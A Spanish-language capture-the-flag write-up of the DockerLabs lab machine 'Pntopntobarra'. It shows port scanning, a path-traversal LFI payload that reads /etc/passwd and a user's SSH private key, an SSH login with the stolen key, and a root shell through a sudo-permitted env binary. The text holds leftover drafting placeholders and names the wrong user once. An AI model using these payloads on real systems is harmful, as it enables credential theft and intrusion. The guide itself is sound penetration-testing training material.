---
title: Pntopntobarra - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | maciiii___        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/44261ae0-a713-4bbd-a656-5faac24621f1)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `22` (SSH)
- `80` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p22,80 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/29121e08-d26c-45c2-aef1-be7698e0a060)

# Exploración Web

En el puerto `80`, vemos que hay una pagina web la cual contiene un mensaje de Advertencia y dos botones uno que pone `Hacer clic aquí podría empeorar la situación.` y otro que pone `Ejemplos de computadoras infectadas`.

![image](https://github.com/user-attachments/assets/303820c1-440e-4ad1-b3b0-6e5d1e27018c)


Viendo que codigo fuente vemos que `Ejemplos de computadoras infectadas` vemos que nos redirige a esta ruta `ejemplos.php?images=./ejemplo1.png'`.

![image](https://github.com/user-attachments/assets/b86d67c6-9b0e-4fa4-810d-d617e6d4ad5c)

Vamos a acceder a esa ruta antes que cualquier cosa.

![image](https://github.com/user-attachments/assets/ee0c3bfc-c679-47cf-bcc2-9fdc25cc7eca)

La ruta que podemos ver, lo primero que se me ocurre es porbar la vulnerabiliadad LFI (Explica brevemente).Para ello pondremo lo siguiente.

```URL
http://172.17.0.2/ejemplos.php?images=./../../../etc/passwd
```
![image](https://github.com/user-attachments/assets/da7342eb-23a3-4476-b2a8-36cf38cfaa5f)

Vamos a ver que mas podemos hacer , ya que el puerto `22` esta abierto vamos a ver si podemos sacar el `.ssh` de algun usuario.

![image](https://github.com/user-attachments/assets/3d27550e-5c05-45ba-8a24-d9f12a312002)

# Intrusion

Existe el usuario `nico` por lo que probaremos si tiene su `id_rsa` (Explica que es brevemente) y asi poder acceder desde su usuario.

```URL
http://172.17.0.2/ejemplos.php?images=./../../../home/nico/.ssh/id_rsa
```
![image](https://github.com/user-attachments/assets/4b2a0dea-55c1-4d11-816f-e6617861c8eb)

Ya obtuvimos su` id_rsa `.

La copiamos en nuestra maquina y accedemos con ella. 

```bash
ssh -i id_rsa  nico@172.17.0.2                        
```

Ya estamos dentro con el usaurio `nico`.

![image](https://github.com/user-attachments/assets/864916ad-318b-4853-a86f-6b4110b300b8)


# Escalada de Privilegios.

Al ejecutar `sudo -l`, notamos que spencer tiene permisos para ejecutar `env` como `root`.Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/d2ca0d5c-82ce-432f-8d60-329ce7205c51)

```bash
sudo env /bin/sh
```
Con este comando, obtuvimos acceso root.

![image](https://github.com/user-attachments/assets/aee995db-8183-4286-9b25-71893c4199d3)
